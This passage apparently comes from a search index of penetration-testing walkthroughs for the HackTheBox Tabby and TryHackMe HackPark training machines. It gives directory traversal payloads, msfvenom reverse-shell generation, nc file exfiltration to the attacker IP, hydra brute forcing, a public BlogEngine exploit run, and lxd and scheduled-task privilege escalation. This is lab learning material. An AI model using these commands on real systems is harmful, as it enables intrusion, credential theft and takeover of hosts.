-Pn 10.10.10.194 -p22,80,8080 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 17:36 +07 Nmap scan report for 10.10.10.194 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA) | 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA) |_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Tabby/index.html#apache-httpd-2441","text":"At port 80, this is web application megahosting . At the All URLs of home page, I saw a link http://megahosting.htb/news.php?file=statement to get contain of file statement . ### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Date: Thu, 08 Apr 2021 03:26:56 GMT Server: Apache/2.4.41 (Ubuntu) Content-Type: text/html; charset=UTF-8 [+] All URLs <title>Mega Hosting</title> <snip> <li><a href=\"http://megahosting.htb/news.php?file=statement\">News</a></li> <snip> But the url using domain megahosting.htb , I add this domain to file hosts. \u250c\u2500\u2500(root\ud83d\udc80kali)-[/home/kali/scripting] \u2514\u2500# echo '10.10.10.194 megahosting.htb' >> /etc/hosts Go to this url in the browser. Try to sent directory traversal payload to read system file and it works. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.4:23.2]~ \u2514\u2500$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../etc/passwd' root:x:0:0:root:/root:/bin/bash <snip> ash:x:1000:1000:clive:/home/ash:/bin/bash","title":"Apache httpd 2.4.41"},{"location":"walkthrough/hackthebox/Tabby/index.html#apache-tomcat-9","text":"Poc code here At port 8080, it is tomcat 9 in a default page. I tried to guess some default credential for manager page, but I can't get in. But there is a directory traversal vulnerability in port 80, let's use it to find the credential for manager page.","title":"Apache Tomcat 9"},{"location":"walkthrough/hackthebox/Tabby/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Tabby/index.html#path-travel-to-tomcat-creds","text":"Poc code here I search location of file tomcat-users.xml and this is helpful File list of package tomcat9 . Using directory traversal vulberability at port 80 to read file tomcat-users.xml . I have credential tomcat:$3cureP4s5w0rd123! with role admin-gui and manager-script . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:27.1]~/scripting \u2514\u2500$ curl 'http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml' <snip> --> <role rolename=\"admin-gui\"/> <role rolename=\"manager-script\"/> <user username=\"tomcat\" password=\"$3cureP4s5w0rd123!\" roles=\"admin-gui,manager-script\"/> </tomcat-users>","title":"Path Travel to Tomcat Creds"},{"location":"walkthrough/hackthebox/Tabby/index.html#manager-script-deploy","text":"Poc code here Follow role of the knowed credential, I search for deploy shell with manager script and I found Deploy_A_New_Application_Archive_(WAR)_Remotely Deployt a war file at http://localhost:8080/manager/text/deploy?path=/foo This link tomcat manager deploy guide how to deploy with curl . curl --upload-file appplication-0.1-1.war \"http://tomcat:tomcat@localhost:8080/manager/deploy?path=/application-0.1-1 First, I create shell.war using msfvenom \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.1]~/walkthrough/hackthebox/tabby \u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war > shell.war Payload size: 1100 bytes Final size of war file: 1100 bytes Using curl to upload shell file to server with knowed credential. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/shell' OK - Deployed application at context path [/shell] Execute shell at url http://megahosting.htb:8080/shell/ . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:30.1]~/walkthrough/hackthebox/tabby \u2514\u2500$ curl http://megahosting.htb:8080/shell/ At listener, I have reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:29.2]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 54320 id uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)","title":"Manager script deploy"},{"location":"walkthrough/hackthebox/Tabby/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Tabby/index.html#zip-password-cracking","text":"Poc code here After do some local enum in the server, I found a backup file at /var/www/html/files tomcat@tabby:/var/www/html$ ls assets favicon.ico files index.php logo.png news.php Readme.txt tomcat@tabby:/var/www/html$ cd files tomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip archive revoked_certs statement tomcat@tabby:/var/www/html/files$ nc -nv 10.10.14.5 445 < 16162020_backup.zip 2021/04/08 04:16:19 CMD: UID=997 PID=62575 | nc -nv 10.10.14.5 445 Connection to 10.10.14.5 445 port [tcp/*] succeeded! Donwload file 16162020_backup.zip to kali machine using nc \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.5:33.0]~/walkthrough/hackthebox/tabby \u2514\u2500$ sudo nc -nvlp 445 > 16162020_backup.zip listening on [any] 445 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.194] 50276 This file require password to unzip. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.7:14.6]~/walkthrough/hackthebox/tabby \u2514\u2500$ unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: Let's using zip2john to get a hash of this file and crack it. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ zip2john 16162020_backup.zip > hash Using directory rockyou.txt to crack file hash and I got the password admin@it \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.2]~/walkthrough/hackthebox/tabby \u2514\u2500$ john hash --wordlist=/home/kali/directory/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status admin@it (16162020_backup.zip) 1g 0:00:00:01 DONE (2021-04-08 11:05) 0.6944g/s 7196Kp/s 7196Kc/s 7196KC/s adnc153..adenabuck Use the \"--show\" option to display all of the cracked passwords reliably Session completed Unzip this file but I don't have more info, this is only backup file for the web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:31.3]~/walkthrough/hackthebox/tabby \u2514\u2500$ unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: inflating: var/www/html/favicon.ico creating: var/www/html/files/ inflating: var/www/html/index.php extracting: var/www/html/logo.png inflating: var/www/html/news.php inflating: var/www/html/Readme.txt In the other way, I try to login to user ash with some knowed password $3cureP4s5w0rd123! and admin@it . With password admin@it , I got user permission. tomcat@tabby:/home$ ls ash tomcat@tabby:/home$ su ash Password: ash@tabby:/home$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)","title":"Zip Password Cracking"},{"location":"walkthrough/hackthebox/Tabby/index.html#lxdlxc-mount-file","text":"Poc code here Checking user ash, this user in lxd/lxc group ash@tabby:/tmp$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) At lxd/lxc Group - Privilege escalation , I can follow it to get root #Install requirements sudo apt update sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools #Clone repo sudo go get -d -v github.com/lxc/distrobuilder #Make distrobuilder cd $HOME/go/src/github.com/lxc/distrobuilder Make install with root account in kali machine \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/go/src/github.com/lxc/distrobuilder] \u2514\u2500# make gofmt -s -w . go install -v ./... go: downloading gopkg.in/yaml.v2 v2.4.0 <snip> distrobuilder built successfully #Prepare the creation of alpine mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml Build file lxd with distrobuilder \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ContainerImages/alpine] \u2514\u2500# /root/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 <snip> \u250c\u2500\u2500(root\ud83d\udc80kali)-[~/ContainerImages/alpine] \u2514\u2500# ls alpine.yaml lxd.tar.xz rootfs.squashfs When I deploy file lxd.tar.xz while using reverse shell, I got error No such file or directory for file lxd.tar.xz . Let's add authorized_keys to server and using ssh with private key. Deploy image again and it work. ash@tabby:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine Image imported with fingerprint: 344c9cfe47fc1c5ff64a553087b3e11649aa40dd47dc074b56488a700479f3bf ash@tabby:/tmp$ lxc image list +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ | alpine | 344c9cfe47fc | no | Alpinelinux 3.8 x86_64 (20210408_0521) | x86_64 | CONTAINER | 1.92MB | Apr 8, 2021 at 5:49am (UTC) | +--------+--------------+--------+----------------------------------------+--------------+-----------+--------+-----------------------------+ Get error while create comtainer. ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true Creating privesc Error: No storage pool found. Please create a new storage pool Search error with google and I have to init before create container ash@tabby:/tmp$ lxd init <snip> Create container again and it work ash@tabby:/tmp$ lxc init alpine privesc -c security.privileged=true Creating privesc ash@tabby:/tmp$ lxc list +---------+---------+------+------+-----------+-----------+ | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS | +---------+---------+------+------+-----------+-----------+ | privesc | STOPPED | | | CONTAINER | 0 | +---------+---------+------+------+-----------+-----------+ Mount container privesc with path /mnt/root to source from Tabby / . Go to check /mnt/root and I got file root.txt ash@tabby:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true Device host-root added to privesc ash@tabby:/tmp$ lxc start privesc ash@tabby:/tmp$ lxc exec privesc /bin/sh ~ # cd /mnt/root /mnt/root # ls bin cdrom etc lib lib64 lost+found mnt proc run snap swap.img tmp var boot dev home lib32 libx32 media opt root sbin srv sys usr /mnt/root # cat root/root.txt ba2c48cc39dd91fdd4bc355dfa033265","title":"lxd/lxc mount file"},{"location":"walkthrough/hackthebox/__init__/index.html","text":"HackTheBox Popcorn Author: Hades Scripting here Information Gathering Openning Services Foothold Privilege Escalation Local enumeration","title":"HackTheBox Popcorn"},{"location":"walkthrough/hackthebox/__init__/index.html#hackthebox-popcorn","text":"Author: Hades Scripting here","title":"HackTheBox Popcorn"},{"location":"walkthrough/hackthebox/__init__/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/__init__/index.html#openning-services","text":"","title":"Openning Services"},{"location":"walkthrough/hackthebox/__init__/index.html#_1","text":"","title":""},{"location":"walkthrough/hackthebox/__init__/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/__init__/index.html#_2","text":"","title":""},{"location":"walkthrough/hackthebox/__init__/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/__init__/index.html#local-enumeration","text":"","title":"Local enumeration"},{"location":"walkthrough/hackthebox/__init__/index.html#_3","text":"","title":""},{"location":"walkthrough/tryhackme/HackPark/index.html","text":"TryHackMe HackPark Author: Hades Scripting here VM Details Name HackPark Created by tryhackme Date release 614 days old (/4/2021) Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.192.95 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,3389 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.192.95 -p80,3389 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 10:36 +07 Nmap scan report for 10.10.192.95 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=hackpark | Not valid before: 2021-04-11T03:28:18 |_Not valid after: 2021-10-11T03:28:18 |_ssl-date: 2021-04-12T03:36:24+00:00; -1s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds Microsoft IIS httpd 8.5 ### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Cache-Control: private Content-Length: 9415 Content-Type: text/html; charset=utf-8 Server: Microsoft-IIS/8.5 Content-Style-Type: text/css Content-Script-Type: text/javascript X-Powered-By: ASP.NET Date: Mon, 12 Apr 2021 03:32:51 GMT [+] Files and directories gobuster dir -k -u http://10.10.192.95:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /content (Status: 301) [Size: 154] [--> http://10.10.192.95:80/content/] /admin (Status: 302) [Size: 172] [--> http://10.10.192.95/Account/login.aspx?ReturnURL=/admin] <snip> Search public exploit using searchsploit \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[4.9:27.3]~ \u2514\u2500$ searchsploit BlogEngine ------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------ --------------------------------- BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection | xml/webapps/48422.txt BlogEngine 3.3 - XML External Entity Injection | windows/webapps/46106.txt <snip> BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Cod | aspx/webapps/47010.py BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remot | aspx/webapps/47011.py BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py ------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Foothold Brute Force Admin Poc code here Based on gobuster results, I go to http://10.10.192.95/Account/login.aspx?ReturnURL=/admin and brute force admin's credential password. Some user may active in the system is Administrator, Pennywise, Admin, Hackpark, Visitor1 . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[5.6:28.3]~/walkthrough/tryhackme/hackpark \u2514\u2500$ hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt 10.10.192.95 http-form-post '/Account/login.aspx:__VIEWSTATE=u%2Bg4t0W3qxAW3PECKLL0iq6XpDhzZWFzKEPQP2y16WH8I1gWd6wljTdOC0kamnXFmJNqhSqXe8Y93uvTfpuU%2FbGbnKb9ha%2FLtNNZvoxakyymix9j4okCpQcEYSsCGnkhWJkt02vqX3VMYKZXkVDs9GpfrfSAum8Gk9V%2FJzLsFU%2BFVNz0&__EVENTVALIDATION=XWG4XEGx3vkstzRKxm%2Bd2ATu0D%2FxXFsUyTNNDa8YIE94CqTjspwHvbfaptpY5i4BftorvtRQeMbUZLNF3bVofOToGAPwlbr6o1jhRwU5F6L1l%2FIqeELlNZuZDqoE%2Fv2Hn57xoQH3VNkmVM%2FSxdo3pGiowXAqdBNvGR7Do5fLMjuYP8GP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -I -t 64 <snip> [80][http-post-form] host: 10.10.192.95 login: Admin password: 1qaz2wsx <snip> RCE 'theme Cookie' Poc code here With knowed credential and public exploit found, I used exploit aspx/webapps/47011.py and exeute it to get reverse shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.6:41.6]~/walkthrough/tryhackme/hackpark \u2514\u2500$ python 47011.py -t 10.10.128.40 -u admin -p 1qaz2wsx -l 10.11.32.198:443 At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.6:41.7]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49352 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv> whoami c:\\windows\\system32\\inetsrv>whoami iis apppool\\blog Privilege Escalation Local enumeration Enum folder Program Files and Program Files (x86) . At folder rogram Files (x86) , I saw program SystemScheduler had been instaled. c:\\Program Files (x86)>powershell -c \"dir | get-acl\" <snip> SystemScheduler BUILTIN\\Administrators Everyone Allow Modify... <snip> Checking running service c:\\Program Files (x86)>powershell -c \"get-service\" powershell -c \"get-service\" Status Name DisplayName ------ ---- ----------- <snip> Running WindowsScheduler System Scheduler Service <snip> c:\\Program Files (x86)>sc qc WindowsScheduler sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: WindowsScheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem So far, folder SystemScheduler allow Everyone modify while service WindowsScheduler running as admin. Tasks File Overwrite Poc code here Checking log to get overwrite file name. At folder Events, I have file log for running service c:\\Program Files (x86)\\SystemScheduler\\Events>dir <snip> 04/12/2021 12:21 AM 1,926 20198415519.INI 04/12/2021 12:21 AM 32,252 20198415519.INI_LOG.txt <snip> In log file, I know that SystemScheduler service run file Message.exe every single minute. c:\\Program Files (x86)\\SystemScheduler\\Events>type 20198415519.INI_LOG.txt type 20198415519.INI_LOG.txt 08/04/19 15:06:01,Event Started Ok, (Administrator) 08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator) 08/04/19 15:07:00,Event Started Ok, (Administrator) 08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator) 08/04/19 15:08:00,Event Started Ok, (Administrator) 08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator) 08/04/19 15:09:00,Event Started Ok, (Administrator) Let's create file reverse shell using msfvenom named Message.exe \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.5:41.0]~/walkthrough/tryhackme/hackpark \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f exe -o Message.exe Upload this file to SystemScheduler folder and wait for reverse shell. c:\\Program Files (x86)\\SystemScheduler>dir <snip> 04/12/2021 12:03 AM 73,802 Message.exe 03/25/2018 10:58 AM 536,992 Message.exe.1 At the listener, I have system shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.5:41.1]~/walkthrough/tryhackme/hackpark \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49403 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\PROGRA~2\\SYSTEM~1>cd c:\\ cd c:\\ c:\\>whoami whoami hackpark\\administrator","title":"HackPark"},{"location":"walkthrough/tryhackme/HackPark/index.html#tryhackme-hackpark","text":"Author: Hades Scripting here","title":"TryHackMe HackPark"},{"location":"walkthrough/tryhackme/HackPark/index.html#vm-details","text":"Name HackPark Created by tryhackme Date release 614 days old (/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/HackPark/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/HackPark/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.192.95 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,3389 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.192.95 -p80,3389 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 10:36 +07 Nmap scan report for 10.10.192.95 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=hackpark | Not valid before: 2021-04-11T03:28:18 |_Not valid after: 2021-10-11T03:28:18 |_ssl-date: 2021-04-12T03:36:24+00:00; -1s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/HackPark/index.html#microsoft-iis-httpd-85","text":"### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Cache-Control: private Content-Length: 9415 Content-Type: text/html; charset=utf-8 Server: Microsoft-IIS/8.5 Content-Style-Type: text/css Content-Script-Type: text/javascript X-Powered-By: ASP.NET Date: Mon, 12 Apr 2021 03:32:51 GMT [+] Files and directories gobuster dir -k -u http://10.10.192.95:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /content (Status: 301) [Size: 154] [--> http://10.10.192.95:80/content/] /admin (Status: 302) [Size: 172] [--> http://10.10.192.95/Account/login.aspx?ReturnURL=/admin] <snip> Search public exploit using searchsploit \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[4.9:27.3]~ \u2514\u2500$ searchsploit BlogEngine ------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------ --------------------------------- BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection | xml/webapps/48422.txt BlogEngine 3.3 - XML External Entity Injection | windows/webapps/46106.txt <snip> BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Cod | aspx/webapps/47010.py BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remot | aspx/webapps/47011.py BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py ------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results","title":"Microsoft IIS httpd 8.5"},{"location":"walkthrough/tryhackme/HackPark/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/HackPark/index.html#brute-force-admin","text":"Poc code here Based on gobuster results, I go to http://10.10.192.95/Account/login.aspx?ReturnURL=/admin and brute force admin's credential password. Some user may active in the system is Administrator, Pennywise, Admin, Hackpark, Visitor1 . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[5.6:28.3]~/walkthrough/tryhackme/hackpark \u2514\u2500$ hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt 10.10.192.95 http-form-post '/Account/login.aspx:__VIEWSTATE=u%2Bg4t0W3qxAW3PECKLL0iq6XpDhzZWFzKEPQP2y16WH8I1gWd6wljTdOC0kamnXFmJNqhSqXe8Y93uvTfpuU%2FbGbnKb9ha%2FLtNNZvoxakyymix9j4okCpQcEYSsCGnkhWJkt02vqX3VMYKZXkVDs9GpfrfSAum8Gk9V%2FJzLsFU%2BFVNz0&__EVENTVALIDATION=XWG4XEGx3vkstzRKxm%2Bd2ATu0D%2FxXFsUyTNNDa8YIE94CqTjspwHvbfaptpY5i4BftorvtRQeMbUZLNF3bVofOToGAPwlbr6o1jhRwU5F6L1l%2FIqeELlNZuZDqoE%2Fv2Hn57xoQH3VNkmVM%2FSxdo3pGiowXAqdBNvGR7Do5fLMjuYP8GP&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -I -t 64 <snip> [80][http-post-form] host: 10.10.192.95 login: Admin password: 1qaz2wsx <snip>","title":"Brute Force Admin"},{"location":"walkthrough/tryhackme/HackPark/index.html#rce-theme-cookie","text":"Poc code here With knowed credential and public exploit found, I used exploit aspx/webapps/47011.py and exeute it to get reverse shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.6:41.6]~/walkthrough/tryhackme/hackpark \u2514\u2500$ python 47011.py -t 10.10.128.40 -u admin -p 1qaz2wsx -l 10.11.32.198:443 At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.6:41.7]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49352 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv> whoami c:\\windows\\system32\\inetsrv>whoami iis apppool\\blog","title":"RCE 'theme Cookie'"},{"location":"walkthrough/tryhackme/HackPark/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/HackPark/index.html#local-enumeration","text":"Enum folder Program Files and Program Files (x86) . At folder rogram Files (x86) , I saw program SystemScheduler had been instaled. c:\\Program Files (x86)>powershell -c \"dir | get-acl\" <snip> SystemScheduler BUILTIN\\Administrators Everyone Allow Modify... <snip> Checking running service c:\\Program Files (x86)>powershell -c \"get-service\" powershell -c \"get-service\" Status Name DisplayName ------ ---- ----------- <snip> Running WindowsScheduler System Scheduler Service <snip> c:\\Program Files (x86)>sc qc WindowsScheduler sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: WindowsScheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem So far, folder SystemScheduler allow Everyone modify while service WindowsScheduler running as admin.","title":"Local enumeration"},{"location":"walkthrough/tryhackme/HackPark/index.html#tasks-file-overwrite","text":"Poc code here Checking log to get overwrite file name. At folder Events, I have file log for running service c:\\Program Files (x86)\\SystemScheduler\\Events>dir <snip> 04/12/2021 12:21 AM 1,926 20198415519.INI 04/12/2021 12:21 AM 32,252 20198415519.INI_LOG.txt <snip> In log file, I know that SystemScheduler service run file Message.exe every single minute. c:\\Program Files (x86)\\SystemScheduler\\Events>type 20198415519.INI_LOG.txt type 20198415519.INI_LOG.txt 08/04/19 15:06:01,Event Started Ok, (Administrator) 08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator) 08/04/19 15:07:00,Event Started Ok, (Administrator) 08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator) 08/04/19 15:08:00,Event Started Ok, (Administrator) 08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator) 08/04/19 15:09:00,Event Started Ok, (Administrator) Let's create file reverse shell using msfvenom named Message.exe \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.5:41.0]~/walkthrough/tryhackme/hackpark \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f exe -o Message.exe Upload this file to SystemScheduler folder and wait for reverse shell. c:\\Program Files (x86)\\SystemScheduler>dir <snip> 04/12/2021 12:03 AM 73,802 Message.exe 03/25/2018 10:58 AM 536,992 Message.exe.1 At the listener, I have system shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.5:41.1]~/walkthrough/tryhackme/hackpark \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.128.40] 49403 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\PROGRA~2\\SYSTEM~1>cd c:\\ cd c:\\ c:\\>whoami whoami hackpark\\administrator","title":"Tasks File Overwrite"},{"location":"walkthrough/tryhackme/Ignite/index.html","text":"TryHackMe Ignite Author: Hades Scripting here VM Details Name Ignite Created by DarkStar7471 Date release 864 days old (9/4/2021) Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.105.151 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.105.151 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 22:50 +07 Nmap scan report for 10.10.105.151 Host is up (0.19s latency). PORT STATE SERVICE VERSION 